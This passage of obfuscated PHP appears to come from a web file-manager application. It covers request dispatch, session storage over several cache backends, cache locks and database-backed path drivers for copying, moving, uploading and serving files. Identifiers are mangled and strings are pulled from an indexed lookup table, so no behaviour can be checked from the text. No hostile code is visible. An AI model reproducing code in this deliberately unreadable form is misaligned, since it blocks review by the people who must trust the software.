$¬×¾œÔ”[0](); if (!method_exists($èñØİğÚ, $¬×¾œÔ”[1])) { echo $•‹Şª´‹[1616]; } else { call_user_func_array(array($èñØİğÚ, $¬×¾œÔ”[1]), $²ÁÍÒÊ«); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ï£àß å], $²ÁÍÒÊ«); if (self::$halts) { return; } } } } $Ï£àß å++; } } if ($ï…—¦º == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $§Ãñ¿à˜ =& $_SERVER[Ó¡Ÿ§‚]; header($_SERVER[$§Ãñ¿à˜[1617]] . $§Ãñ¿à˜[1618]); echo $§Ãñ¿à˜[1619]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$•‹Şª´‹[1612]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $™ƒüá¾ =& $_SERVER[Ó¡Ÿ§‚]; static $±æÄ—š = false; if ($±æÄ—š) { return $±æÄ—š; } $áûéÆÏÑ = $GLOBALS[$™ƒüá¾[6]][$™ƒüá¾[349]]; self::$sessionTime = $áûéÆÏÑ[$™ƒüá¾[1620]]; $¯ˆÏĞšÓ = isset($GLOBALS[$™ƒüá¾[1621]]) ? $GLOBALS[$™ƒüá¾[1621]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¯ˆÏĞšÓ)) { self::$sessionSign = Cookie::get($¯ˆÏĞšÓ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¯ˆÏĞšÓ, self::$sessionSign, self::$sessionTime); $ÂÏíŞÏ = $áûéÆÏÑ[$™ƒüá¾[1622]]; $‰Æ¹‡™Â = $áûéÆÏÑ[$ÂÏíŞÏ]; $ƒƒåİ†ã = $áûéÆÏÑ[$™ƒüá¾[827]]; switch ($ÂÏíŞÏ) { case $™ƒüá¾[21]: self::$handle = Model($™ƒüá¾[828]); break; case $™ƒüá¾[829]: self::$handle = new CacheRedis($‰Æ¹‡™Â, $ƒƒåİ†ã); break; case $™ƒüá¾[830]: self::$handle = new CacheMemcached($‰Æ¹‡™Â, $ƒƒåİ†ã); break; case $™ƒüá¾[200]: $‰Æ¹‡™Â[$™ƒüá¾[84]] = $‰Æ¹‡™Â[$™ƒüá¾[84]] . $™ƒüá¾[1623]; self::$handle = new CacheFile($‰Æ¹‡™Â, $ƒƒåİ†ã); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $±æÄ—š = new self(); return $±æÄ—š; } public static function getBySign($’§û€é¼) { $Ë¡¸ˆì = self::$handle->get($’§û€é¼); $Ë¡¸ˆì = unserialize($Ë¡¸ˆì); return is_array($Ë¡¸ˆì) ? $Ë¡¸ˆì : array(); } public static function setBySign($ô¬˜ €É, $¸¥¹¢úÖ) { CacheLock::lock($ô¬˜ €É); self::$handle->set($ô¬˜ €É, serialize($¸¥¹¢úÖ), self::$sessionTime); CacheLock::unlock($ô¬˜ €É); } public static function sign($¸¢Î’›¸ = false) { $¸¢Î’›¸ && (self::$sessionSign = $¸¢Î’›¸); self::init(); return self::$sessionSign; } public static function set($éÜª´¤ù, $¾©á„“ = false) { self::init(); if (is_array($éÜª´¤ù)) { foreach ($éÜª´¤ù as $¹‘Õ±½¡ => $•¥ÆÚâ°) { array_set_value(self::$data, $¹‘Õ±½¡, $•¥ÆÚâ°); } } else { array_set_value(self::$data, $éÜª´¤ù, $¾©á„“); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Éó€¶É± = false) { self::init(); if (!$Éó€¶É±) { return self::$data; } return array_get_value(self::$data, $Éó€¶É±); } public static function remove($‡²¢×§) { self::init(); unset(self::$data[$‡²¢×§]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ó¡Ÿ§‚][832])) { self::$handle->clearTimeout(); } } } goto b‰°†Òß; EÆÒôŸ­: class CacheLockRedis { public function lock($á¦—Öíú, $µÎ­ÁÈ¼ = 10) { $×ÒÂ”ºª = Cache::init(); $®ğáÍòš = microtime(!0) + $µÎ­ÁÈ¼; while (microtime(!0) < $®ğáÍòš) { $–ù½ÊîÅ = $×ÒÂ”ºª->get($á¦—Öíú); if (!$–ù½ÊîÅ) { $æôÂ¥® = $×ÒÂ”ºª->setLock($á¦—Öíú, $®ğáÍòš, $µÎ­ÁÈ¼); if ($æôÂ¥®) { return !0; } } else { if ($–ù½ÊîÅ < microtime(!0)) { $×ÒÂ”ºª->set($á¦—Öíú, $®ğáÍòš, $µÎ­ÁÈ¼ * 2); if ($×ÒÂ”ºª->get($á¦—Öíú) === $–ù½ÊîÅ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($à¦®…Ç) { return Cache::init()->get($à¦®…Ç); } public function unlock($èë ´öˆ) { return Cache::init()->remove($èë ´öˆ); } } class CacheLockMemcached { public function lock($‹˜¸¡Œı, $º’ñµøœ = 0) { $ÒàÊ­™Ç = Cache::init(); $ï•öæÖ· = microtime(!0) + $º’ñµøœ; while (microtime(!0) < $ï•öæÖ·) { $ëæ¨âÆı = $ÒàÊ­™Ç->get($‹˜¸¡Œı); if (!$ëæ¨âÆı || $ëæ¨âÆı < microtime(!0)) { $¸Æƒ„Å = $ÒàÊ­™Ç->handle->add($‹˜¸¡Œı, $ï•öæÖ·, $º’ñµøœ); if ($¸Æƒ„Å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ûƒÂÓÍÕ) { return Cache::init()->get($ûƒÂÓÍÕ); } public function unlock($²©Áá€) { return Cache::init()->remove($²©Áá€); } } class CacheLockDatabase { public function lock($øĞÍ‰€, $ÏµŞº·í = 0) { $Œ¢Ô²Â = Model($_SERVER[Ó¡Ÿ§‚][828]); $Ó†ĞûéÇ = microtime(!0) + $ÏµŞº·í; while (microtime(!0) < $Ó†ĞûéÇ) { $¿úø›·• = $Œ¢Ô²Â->get($øĞÍ‰€); if (!$¿úø›·• || $¿úø›·• < microtime(!0)) { $©µ¿óÜÃ = $Œ¢Ô²Â->set($øĞÍ‰€, $Ó†ĞûéÇ); if ($©µ¿óÜÃ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($áñÜºå) { return Model($_SERVER[Ó¡Ÿ§‚][828])->get($áñÜºå); } public function unlock($¬ìşíŸ) { Model($_SERVER[Ó¡Ÿ§‚][828])->remove($¬ìşíŸ); } } goto BÉƒ Ÿ…±; A…“Àœ·¬¿: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ç Ñè³Ú) { $this->pathParse = $Ç Ñè³Ú; $this->model = Model($_SERVER[Ó¡Ÿ§‚][1338]); } public function getPath($îÙâ¶ÂÎ) { return trim($îÙâ¶ÂÎ, $_SERVER[Ó¡Ÿ§‚][8]); } public function pathFather($˜¦±¨ü§) { $£ôåòØ« = $this->parse($˜¦±¨ü§); $£ôåòØ« = $this->infoSimple($˜¦±¨ü§); return $£ôåòØ« ? $£ôåòØ«[$_SERVER[Ó¡Ÿ§‚][441]] : !1; } public function pathThis($†¹“¤İ) { $ÖàØ†×Š = $this->infoSimple($†¹“¤İ); return $ÖàØ†×Š ? $ÖàØ†×Š[$_SERVER[Ó¡Ÿ§‚][32]] : !1; } public function getPathOuter($‚”–àŞ) { if (!$‚”–àŞ) { return $‚”–àŞ; } $ôÜÎÎì = $this->parse($‚”–àŞ); return KodIO::make($ôÜÎÎì[$_SERVER[Ó¡Ÿ§‚][399]]); } public function copyFolderFromIO($ÇÁ³Ãî, $’Õ†ç­», $Ê¸å·Á, $Ñ´Íƒ¹ë, $İı°òÈ) { $³¹êÏÎ = $this->model->copyFolderFromIO($ÇÁ³Ãî, $’Õ†ç­», $Ê¸å·Á, $Ñ´Íƒ¹ë, $İı°òÈ); return KodIO::make($³¹êÏÎ); } public function isParentOf($¿àò¡‘ß, $»åóÀÌ“) { return $this->model->isParentOf($¿àò¡‘ß, $»åóÀÌ“); } public function mkfile($ôË‡é“, $İ‘ò’œ‘ = '', $»ƒçãóÙ = REPEAT_RENAME) { $Ìª¦¶»ä =& $_SERVER[Ó¡Ÿ§‚]; $‚´×ŸË² = $this->parse($ôË‡é“); $ôË‡é“ = $‚´×ŸË²[$Ìª¦¶»ä[399]]; for ($åòØ‚íè = 0; $åòØ‚íè < count($‚´×ŸË²[$Ìª¦¶»ä[1339]]); $åòØ‚íè++) { $É¤öèƒÊ = $‚´×ŸË²[$Ìª¦¶»ä[1339]][$åòØ‚íè]; if ($åòØ‚íè == count($‚´×ŸË²[$Ìª¦¶»ä[1339]]) - 1) { $ôË‡é“ = $this->model->mkfile($ôË‡é“, $É¤öèƒÊ, $İ‘ò’œ‘, $»ƒçãóÙ); break; } $ôË‡é“ = $this->model->mkdir($ôË‡é“, $É¤öèƒÊ, REPEAT_SKIP); } return $this->getPathOuter($ôË‡é“); } public function mkdir($öîù§—€, $ÉôÀ„ê¾ = REPEAT_SKIP) { $É¶—ãï =& $_SERVER[Ó¡Ÿ§‚]; $¦ÎŒƒŠŠ = $this->parse($öîù§—€); $öîù§—€ = $¦ÎŒƒŠŠ[$É¶—ãï[399]]; for ($Æá­—ğú = 0; $Æá­—ğú < count($¦ÎŒƒŠŠ[$É¶—ãï[1339]]); $Æá­—ğú++) { $¹”Ëöâİ = $¦ÎŒƒŠŠ[$É¶—ãï[1339]][$Æá­—ğú]; $öîù§—€ = $this->model->mkdir($öîù§—€, $¹”Ëöâİ, $ÉôÀ„ê¾); } return $this->getPathOuter($öîù§—€); } public function copyFile($ï¢ƒ†Ì—, $ƒ®ÊçÑ†, $¿óÏ¥øâ = REPEAT_REPLACE) { $«‡Œ³¥É =& $_SERVER[Ó¡Ÿ§‚]; $ Ô‘õ¬Ê = $this->parse($ƒ®ÊçÑ†); $¼ÕÕ‡• = $this->model->copy($ï¢ƒ†Ì—, $ Ô‘õ¬Ê[$«‡Œ³¥É[399]], $¿óÏ¥øâ, $ Ô‘õ¬Ê[$«‡Œ³¥É[84]]); return $¼ÕÕ‡• ? $this->getPathOuter($¼ÕÕ‡•) : !1; } public function moveFile($·ˆû·ì¼, $şË¦ä¨È, $¾œğ‚À† = REPEAT_REPLACE) { $Ô§‚‹´Ú =& $_SERVER[Ó¡Ÿ§‚]; $ õôïš = $this->parse($şË¦ä¨È); $ÖÏÔèıÛ = $this->model->move($·ˆû·ì¼, $ õôïš[$Ô§‚‹´Ú[399]], $¾œğ‚À†, $ õôïš[$Ô§‚‹´Ú[84]]); return $ÖÏÔèıÛ ? $this->getPathOuter($ÖÏÔèıÛ) : !1; } public function copy($ó›¹Ÿà‡, $ £®–«, $ğÜ°—¯ = REPEAT_REPLACE, $èÅë÷›· = false) { $´…üı¹à = $this->parse($ £®–«); $¦öéÄ³Õ = $this->model->copy($ó›¹Ÿà‡, $´…üı¹à[$_SERVER[Ó¡Ÿ§‚][399]], $ğÜ°—¯, $èÅë÷›·); return $¦öéÄ³Õ ? $this->getPathOuter($¦öéÄ³Õ) : !1; } public function moveSameAllow() { } public function move($¦¡ä¥œ, $æ áş´ë, $ÛõêşÖŒ = REPEAT_REPLACE, $íÚ’»õ„ = false) { $ñğüƒŒõ = $this->parse($æ áş´ë); $®ãôôú = $this->model->move($¦¡ä¥œ, $ñğüƒŒõ[$_SERVER[Ó¡Ÿ§‚][399]], $ÛõêşÖŒ, $íÚ’»õ„); return $®ãôôú ? $this->getPathOuter($®ãôôú) : !1; } public function remove($ã´™ï‘ü, $ÇÏ³™½ = true) { return $this->model->remove($ã´™ï‘ü, $ÇÏ³™½); } public function rename($Çß¹¹û, $çğ‘íÒ‰) { $§ñ¯À³Ë = $this->model->rename($Çß¹¹û, $çğ‘íÒ‰); return $§ñ¯À³Ë ? $this->getPathOuter($Çß¹¹û) : $§ñ¯À³Ë; } public function size($Ë˜úÑÂÒ) { $ªâá„Ë„ = $this->infoSimple($Ë˜úÑÂÒ); return $ªâá„Ë„ ? $ªâá„Ë„[$_SERVER[Ó¡Ÿ§‚][76]] : 0; } public function infoSimple($Ÿ§·ùÈ) { return $this->model->sourceInfo($Ÿ§·ùÈ); } public function info($¥Ëï¥ÀÄ) { return $this->infoParse($¥Ëï¥ÀÄ); } public function infoAuth($ñà‹¿Ñ¶) { return $this->infoParse($ñà‹¿Ñ¶, !1, !0); } public function infoWithChildren($ìÜåàîÕ) { return $this->infoParse($ìÜåàîÕ, !0); } protected function infoParse($å´½¥Üß, $œâ¨ƒ„ = false, $ÊÙø‚ø = false) { if (!$œâ¨ƒ„) { return $this->model->pathInfo($å´½¥Üß, $ÊÙø‚ø); } return $this->model->pathInfoMore($å´½¥Üß); } public function infoFull($ÀìáèŒÀ) { $äø×ûó =& $_SERVER[Ó¡Ÿ§‚]; $óœ”åÁÀ = explode($äø×ûó[8], $ÀìáèŒÀ); $›Îë­« = implode($äø×ûó[8], array_splice($óœ”åÁÀ, 1)); return $this->model->pathInfoByPath($óœ”åÁÀ[0], $›Îë­«); } public function hashSimple($ÃÑ½’ÏÄ) { $°Â®÷×Ò =& $_SERVER[Ó¡Ÿ§‚]; $Æ·Áèª© = $this->infoWithChildren($ÃÑ½’ÏÄ); return $Æ·Áèª©[$°Â®÷×Ò[170]][$°Â®÷×Ò[177]]; } public function hashMd5($ËŒ»£ô) { $°¶¢’á =& $_SERVER[Ó¡Ÿ§‚]; $‰Ê¸€Á = $this->infoWithChildren($ËŒ»£ô); return $‰Ê¸€Á[$°¶¢’á[170]][$°¶¢’á[176]]; } public function exist($Œàüùğ) { $°…Œ£·ì =& $_SERVER[Ó¡Ÿ§‚]; $ê¯ğ„®í = $this->parse($Œàüùğ); if (!$ê¯ğ„®í[$°…Œ£·ì[84]]) { return $this->isFile($Œàüùğ) || $this->isFolder($Œàüùğ); } $‚³öã¸ = array($°…Œ£·ì[410] => $ê¯ğ„®í[$°…Œ£·ì[399]], $°…Œ£·ì[32] => $ê¯ğ„®í[$°…Œ£·ì[84]]); $¦›Ù•¨ = $this->model->where($‚³öã¸)->find(); return $¦›Ù•¨ ? !0 : !1; } public function isFile($—±Í–£») { $«±í‡ëù =& $_SERVER[Ó¡Ÿ§‚]; $¶‘¥ö»ã = $this->infoSimple($—±Í–£»); return $¶‘¥ö»ã && $¶‘¥ö»ã[$«±í‡ëù[419]] == $«±í‡ëù[88] ? !1 : !0; } public function isFolder($ÕĞé§û) { $’®Íœ¤ =& $_SERVER[Ó¡Ÿ§‚]; $û„“ÃÅ = $this->infoSimple($ÕĞé§û); return $û„“ÃÅ && $û„“ÃÅ[$’®Íœ¤[419]] == $’®Íœ¤[88] ? !0 : !1; } public function listPath($²¾ôøŞÑ, $—€„Ó‡» = false) { $ªÔÆœ†¤ =& $_SERVER[Ó¡Ÿ§‚]; if ($²¾ôøŞÑ == $ªÔÆœ†¤[12]) { return !1; } $˜ÃÊ³Êà = array($ªÔÆœ†¤[410] => $²¾ôøŞÑ); if ($—€„Ó‡») { return $this->model->listSource($˜ÃÊ³Êà, -1); } return $this->model->listSource($˜ÃÊ³Êà); } public function has($‡†ŠÍï±, $äïïÕÅ¶ = false, $òÃåÂø¥ = null) { $ª»ìû‘‚ =& $_SERVER[Ó¡Ÿ§‚]; $Á³æ¢‡Ø = $this->infoWithChildren($‡†ŠÍï±); if ($äïïÕÅ¶) { return array($ª»ìû‘‚[208] => $Á³æ¢‡Ø[$ª»ìû‘‚[208]], $ª»ìû‘‚[207] => $Á³æ¢‡Ø[$ª»ìû‘‚[207]]); } return $òÃåÂø¥ ? $Á³æ¢‡Ø[$ª»ìû‘‚[208]] : $Á³æ¢‡Ø[$ª»ìû‘‚[207]]; } public function listAll($‡ÉŸì‡û) { $¦ï­ÈÅÆ = IO::info($this->pathParse[$_SERVER[Ó¡Ÿ§‚][84]]); if (!$¦ï­ÈÅÆ) { return array(); } return $this->model->listAll($‡ÉŸì‡û); } public function getContent($ıË×Ü²Ó) { return $this->model->getContent($ıË×Ü²Ó); } public function setContent($ƒ³­˜£, $æº©ÔøÚ = '') { return $this->model->setContent($ƒ³­˜£, $æº©ÔøÚ); } public function fileSubstr($ãÏ—«õ’, $óÚüŞÊ, $ØÌ’ìôö) { return $this->model->fileSubstr($ãÏ—«õ’, $óÚüŞÊ, $ØÌ’ìôö); } public function download($’È¡ê¼, $œï”ğ¶ó = '') { $ï“÷ÀÚ« = get_path_father($œï”ğ¶ó); $‡ÇûùÉã = get_path_this($œï”ğ¶ó); $ªåßä÷ = $this->model->fileInfoGet($’È¡ê¼); $Æ§÷ı = IO::copy($ªåßä÷[$_SERVER[Ó¡Ÿ§‚][84]], $ï“÷ÀÚ«, !1, $‡ÇûùÉã); return $Æ§÷ı; } public function setModifyTime($Û œĞÙÈ, $µ’õ‹õ = '') { $ˆÌÓÇÀ¹ =& $_SERVER[Ó¡Ÿ§‚]; if (!$Û œĞÙÈ) { return; } $this->model->where(array($ˆÌÓÇÀ¹[426] => $Û œĞÙÈ))->save(array($ˆÌÓÇÀ¹[85] => $µ’õ‹õ)); } public function upload($êë†¼¬Ì, $Â”ä¸ßŸ, $™šú£–Œ = false, $ÆÉ•êò = REPEAT_REPLACE) { $ÓàÒ¿® =& $_SERVER[Ó¡Ÿ§‚]; $©µ”‡Ö– = $this->parse($êë†¼¬Ì); $¨¬ÔÇÙ = $this->model->addFile($©µ”‡Ö–[$ÓàÒ¿®[399]], $Â”ä¸ßŸ, $©µ”‡Ö–[$ÓàÒ¿®[84]], $™šú£–Œ, $ÆÉ•êò); return $this->getPathOuter($¨¬ÔÇÙ); } public function uploadFileByID($è¾Ğéñ, $éåæÓ«Ü, $İ—ƒú¬‚) { $¨«”úäˆ =& $_SERVER[Ó¡Ÿ§‚]; $«š‚¤’Ò = $this->parse($è¾Ğéñ); $©™ø©ô = $this->model->addFileByFileID($«š‚¤’Ò[$¨«”úäˆ[399]], $éåæÓ«Ü, $«š‚¤’Ò[$¨«”úäˆ[84]], $İ—ƒú¬‚); return $this->getPathOuter($©™ø©ô); } public function addFileByRemote($éÎùÊÛÃ, $ášä¡€, $¢¿±Ï– = array(), $öÓ»Œİñ = '', $¡†ßË¼) { $‚• †çµ =& $_SERVER[Ó¡Ÿ§‚]; $ ˜Óì˜ = $this->parse($éÎùÊÛÃ); $öÓ»Œİñ = empty($öÓ»Œİñ) ? $ ˜Óì˜[$‚• †çµ[84]] : $öÓ»Œİñ; $ßó©‘Ëß = $this->model->addFileByRemote($ ˜Óì˜[$‚• †çµ[399]], $ášä¡€, $öÓ»Œİñ, $¢¿±Ï–, $¡†ßË¼); return $this->getPathOuter($ßó©‘Ëß); } public function uploadLink($×£¼î, $â‚ÛêË‘ = 0) { $ñ±ƒ«µ =& $_SERVER[Ó¡Ÿ§‚]; $à˜£üâµ = $this->parse($×£¼î); $­¸¶²¡ = _get($GLOBALS[$ñ±ƒ«µ[7]], $ñ±ƒ«µ[1340]); $“à•ØŸ° = _get($GLOBALS[$ñ±ƒ«µ[7]], $ñ±ƒ«µ[1341]); $×£¼î = Model($ñ±ƒ«µ[610])->createFileName($à˜£üâµ[$ñ±ƒ«µ[84]], $­¸¶²¡, $“à•ØŸ°); return IO::uploadLink($×£¼î, $â‚ÛêË‘); } public function fileNameAuto($€Ü¨¾³, $ˆŸäíŠş, $½ÅÊÒ‹˜ = REPEAT_REPLACE, $€ãºáÈ = false) { return $this->model->fileNameAuto($€Ü¨¾³, $ˆŸäíŠş, $½ÅÊÒ‹˜, $€ãºáÈ); } public function fileNameExist($ƒş‰ªÑà, $»úû¼Ú») { return $this->model->fileNameExist($ƒş‰ªÑà, $»úû¼Ú»); } protected function _fileOut($ïª’±˜”, $ÃÀúÒªÀ = false, $ ©Šûç¯ = false, $àÉ²Õ£ = '', $äÆöë¹ = false) { $ˆÒ…‘°° =& $_SERVER[Ó¡Ÿ§‚]; $ ‘Ô“û = $this->model->sourceInfo($ïª’±˜”); if ($ ‘Ô“û[$ˆÒ…‘°°[419]] == $ˆÒ…‘°°[88]) { header($ˆÒ…‘°°[1342]); die; } $ıˆû•Å = $this->model->fileInfoGet($ïª’±˜”); $àÉ²Õ£ = $ıˆû•Å[$ˆÒ…‘°°[176]] ? $ıˆû•Å[$ˆÒ…‘°°[176]] : $àÉ²Õ£; $¼»õÍÉ¯ = isset($GLOBALS[$ˆÒ…‘°°[1343]]) ? $GLOBALS[$ˆÒ…‘°°[1343]] : $ ‘Ô“û[$ˆÒ…‘°°[32]]; if ($äÆöë¹) { return IO::fileOutServer($ıˆû•Å[$ˆÒ…‘°°[84]], $ÃÀúÒªÀ, $¼»õÍÉ¯, $àÉ²Õ£); } IO::fileOut($ıˆû•Å[$ˆÒ…‘°°[84]], $ÃÀúÒªÀ, $¼»õÍÉ¯, $àÉ²Õ£); } public function fileOut($ŒèªÅò, $é­—°Ñß = false, $¯¥Ş‰Ğ = false, $ú—“Êï¾ = '') { $this->_fileOut($ŒèªÅò, $é­—°Ñß, $¯¥Ş‰Ğ, $ú—“Êï¾); } public function fileOutServer($€©öêæ¬, $³šş·Ìø = false, $öä½ÙÆ’ = false, $È °Ñäã = '') { $this->_fileOut($€©öêæ¬, $³šş·Ìø, $öä½ÙÆ’, $È °Ñäã, !0); } protected function _fileOutImage($Œú¢«¦, $ÜšÅõ‘Ô = 250) { $‹ôŒµÈé =& $_SERVER[Ó¡Ÿ§‚]; $ïÖÊ£˜ = $this->model->pathInfo($Œú¢«¦); if ($ïÖÊ£˜[$‹ôŒµÈé[419]] == $‹ôŒµÈé[88]) { show_json($‹ôŒµÈé[1344] . $Œú¢«¦, !1); } $Æ×ú›ìğ = $this->model->fileInfoGet($Œú¢«¦); $Æ×ú›ìğ[$‹ôŒµÈé[32]] = $ïÖÊ£˜[$‹ôŒµÈé[32]]; $Æ×ú›ìğ[$‹ôŒµÈé[169]] = $ïÖÊ£˜[$‹ôŒµÈé[169]]; $GLOBALS[$‹ôŒµÈé[1343]] = $Æ×ú›ìğ[$‹ôŒµÈé[32]]; $GLOBALS[$‹ôŒµÈé[168]] = $Æ×ú›ìğ; IO::fileOutImage($Æ×ú›ìğ[$‹ôŒµÈé[84]], $ÜšÅõ‘Ô); } public function fileOutImage($Ù´Œ¼éÙ, $µÓ”õÍ = 250) { $this->_fileOutImage($Ù´Œ¼éÙ, $µÓ”õÍ); } public function fileOutImageServer($İïš—¢ı, $¿½úÙÕ÷ = 250) { $this->_fileOutImage($İïš—¢ı, $¿½úÙÕ÷); } public function link($æ™å…ãì, $Á»„ÅãÛ = '') { $ÆÁâù¯ö = $this->model->fileInfoGet($æ™å…ãì); return IO::link($ÆÁâù¯ö[$_SERVER[Ó¡Ÿ§‚][84]], $Á»„ÅãÛ); } protected function parse($åôàò) { $ëó˜Ëİı =& $_SERVER[Ó¡Ÿ§‚]; if (strstr($åôàò, $ëó˜Ëİı[8]) === !1) { return array($ëó˜Ëİı[428] => intval($åôàò), $ëó˜Ëİı[84] => $ëó˜Ëİı[12], $ëó˜Ëİı[1339] => array()); } $¤¤–÷´œ = explode($ëó˜Ëİı[8], trim($åôàò, $ëó˜Ëİı[8])); if (count($¤¤–÷´œ) < 2) { show_tips(clear_html($åôàò) . $ëó˜Ëİı[1345]); } return array($ëó˜Ëİı[428] => intval($¤¤–÷´œ[0]), $ëó˜Ëİı[84] => $¤¤–÷´œ[1], $ëó˜Ëİı[1339] => array_slice($¤¤–÷´œ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($‘“Ï‡) { $this->pathParse = $‘“Ï‡; $this->model = Model($_SERVER[Ó¡Ÿ§‚][1338]); } public function getPathOuter($‘îî÷) { $º´ñß®© =& $_SERVER[Ó¡Ÿ§‚]; if (!$‘îî÷) { return $‘îî÷; } $ûı°è˜† = $this->parse($‘îî÷); return trim(KodIO::makeShare($this->pathParse[$º´ñß®©[399]], $ûı°è˜†[$º´ñß®©[399]]), $º´ñß®©[8]); } protected function infoParse($’Æµ…¬, $õÔ•Ä°Ì = false, $ñ”ê¬• = false) { $Â»Â²¡– =& $_SERVER[Ó¡Ÿ§‚]; $ÅñŞ¤› = $this->pathParse[$Â»Â²¡–[399]]; $Üôûñ¬Ô = trim($this->pathParse[$Â»Â²¡–[1167]], $Â»Â²¡–[8]); return Action($Â»Â²¡–[1346])->sharePathInfo($ÅñŞ¤›, $Üôûñ¬Ô, $õÔ•Ä°Ì); } public function infoFull($°‹Ä”Š¾) { $èê†ŒÌ =& $_SERVER[Ó¡Ÿ§‚]; $èÙŸ¢Ğí = explode($èê†ŒÌ[8], trim($°‹Ä”Š¾, $èê†ŒÌ[8])); if (count($èÙŸ¢Ğí) > 1) { $É–ùÚƒ´ = implode($èê†ŒÌ[8], array_splice($èÙŸ¢Ğí, 1)); $Í‡¥ñæ = $this->model->pathInfoByPath($èÙŸ¢Ğí[0], $É–ùÚƒ´); if (!$Í‡¥ñæ) { return !1; } $this->pathParse[$èê†ŒÌ[1167]] = $Í‡¥ñæ[$èê†ŒÌ[411]]; } return $this->infoParse($°‹Ä”Š¾); } public function listAll($¯ÑŠÖÒ) { $½Ááø€ß =& $_SERVER[Ó¡Ÿ§‚]; $Ì¨Œúış = IO::info($this->pathParse[$½Ááø€ß[84]]); if (!$Ì¨Œúış) { return array(); } $·ÃİêÛ = $this->model->listAll($¯ÑŠÖÒ); $ÄÖ™«˜¹ = Model($½Ááø€ß[601])->getInfo($Ì¨Œúış[$½Ááø€ß[602]]); foreach ($·ÃİêÛ as &$ÚØşÔÀ¹) { check_abort(); $ÚØşÔÀ¹[$½Ááø€ß[87]] = Action($½Ááø€ß[1346])->_shareItemeParse($ÚØşÔÀ¹[$½Ááø€ß[87]], $ÄÖ™«˜¹); } unset($ÚØşÔÀ¹); return $·ÃİêÛ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($½À­š) { $this->pathParse = $½À­š; $this->model = Model($_SERVER[Ó¡Ÿ§‚][1338]); } protected function infoParse($à¤¹Ó…„, $“ÅøÏÓ = false, $Æøåà»œ = false) { $ç€ä¦½õ =& $_SERVER[Ó¡Ÿ§‚]; return Action($ç€ä¦½õ[1173])->sharePathInfo($this->pathParse[$ç€ä¦½õ[84]], !0, $“ÅøÏÓ); } public function listPath($“õöşÖ¦, $éĞÔ²®Ä = false) { $¹±èñô¡ =& $_SERVER[Ó¡Ÿ§‚]; $®±ù†øã = parent::listPath($“õöşÖ¦, $éĞÔ²®Ä); if (!$®±ù†øã) { return $®±ù†øã; } if (is_array($®±ù†øã[$¹±èñô¡[1347]])) { $®±ù†øã[$¹±èñô¡[1347]] = Action($¹±èñô¡[1173])->shareItemInfo($®±ù†øã[$¹±èñô¡[1347]]); } foreach ($®±ù†øã as $§òËû¥Ê => $ÏŠİ€´ê) { if (!in_array($§òËû¥Ê, array($¹±èñô¡[83], $¹±èñô¡[82]))) { continue; } foreach ($ÏŠİ€´ê as $Œ·Ùü×ó => $À¾ÛõÌ£) { $®±ù†øã[$§òËû¥Ê][$Œ·Ùü×ó] = Action($¹±èñô¡[1173])->shareItemInfo($À¾ÛõÌ£); } } return $®±ù†øã; } public function listAll($†Şšº£ï) { $¹¨ÜÎ³Ø =& $_SERVER[Ó¡Ÿ§‚]; $†±ê§Œ„ = IO::info($this->pathParse[$¹¨ÜÎ³Ø[84]]); if (!$†±ê§Œ„) { return array(); } $ˆ‰“øä = $this->model->listAll($†Şšº£ï); foreach ($ˆ‰“øä as &$€ŸÌ‘Õ) { $€ŸÌ‘Õ[$¹¨ÜÎ³Ø[87]] = Action($¹¨ÜÎ³Ø[1173])->shareItemInfo($€ŸÌ‘Õ[$¹¨ÜÎ³Ø[87]]); } unset($€ŸÌ‘Õ); return $ˆ‰“øä; } } goto E²ˆĞ§›õÔ; E²ˆĞ§›õÔ: class PathDriverDriverShareItem { public function __construct($èˆİÏö) { $this->pathParse = $èˆİÏö; } public function __call($‰Ğãõí, $§€¼İ‰) { $ƒôšÉÇ =& $_SERVER[Ó¡Ÿ§‚]; if (method_exists($this, $‰Ğãõí)) { return; } $± ÁºÑ = call_user_func_array(array($ƒôšÉÇ[1348], $‰Ğãõí), $§€¼İ‰); $¶¤™ÚÓğ = array($ƒôšÉÇ[1349], $ƒôšÉÇ[1350], $ƒôšÉÇ[1351], $ƒôšÉÇ[1352], $ƒôšÉÇ[555], $ƒôšÉÇ[557], $ƒôšÉÇ[1353], $ƒôšÉÇ[107], $ƒôšÉÇ[1354], $ƒôšÉÇ[1355]); if (in_array($‰Ğãõí, $¶¤™ÚÓğ)) { $± ÁºÑ = $this->getPathOuter($± ÁºÑ); } return $± ÁºÑ; } public function copy($ØìÆ±™, $çøùÌï¯, $ò¿È¤åÉ = false, $×¾“Õª = false) { return $this->copyMove($ØìÆ±™, $çøùÌï¯, $ò¿È¤åÉ, $_SERVER[Ó¡Ÿ§‚][555], $×¾“Õª); } public function move($¬ºÒØÅ¤, $šØ›óš’, $ó½ƒ — = false, $Š¹ô“Ç¨ = false) { return $this->copyMove($¬ºÒØÅ¤, $šØ›óš’, $ó½ƒ —, $_SERVER[Ó¡Ÿ§‚][557], $Š¹ô“Ç¨); } private function copyMove($×ğé»ÓÊ, $¢œ¤Şó, $Ùò…–Á¿, $Ô½œÖƒÊ, $£ø¨Êº  = false) { $…â™‹–ğ =& $_SERVER[Ó¡Ÿ§‚]; $ªŸá­Ò  = $¢œ¤Şó; $±à™¡ò® = IO::driverMake($¢œ¤Şó); if ($±à™¡ò®->pathParse[$…â™‹–ğ[1150]]) { $¢œ¤Şó = $±à™¡ò®->pathParse[$…â™‹–ğ[1150]]; } else { $¢œ¤Şó = 